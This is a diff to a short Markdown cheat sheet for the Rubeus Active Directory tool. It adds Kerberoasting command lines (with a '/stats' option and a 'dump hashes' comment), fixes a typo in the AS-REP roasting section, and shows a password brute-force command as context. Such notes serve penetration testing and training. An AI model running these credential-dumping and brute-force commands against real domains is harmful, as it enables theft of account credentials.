@@ -21,12 +21,13 @@ Rubeus.exe brute /password:<password> /noticket
 Returns a list of services vulnerable to Kerberoast attacks and relative Kerberos Hash
 
 ```
-Rubeus.exe kerberoast
+Rubeus.exe kerberoast /stats    #get information on vulnerable accounts
+Rubeus.exe kerberoast           #dump hashes
 ```
 
 ## AS-REP Roasting
 
-Returns hasehs of users with  the flag "Do not require Kerberos pre-authentication" disabled
+Returns hashes of users with  the flag "Do not require Kerberos pre-authentication" disabled
 
 ```
 Rubeus.exe asreproast
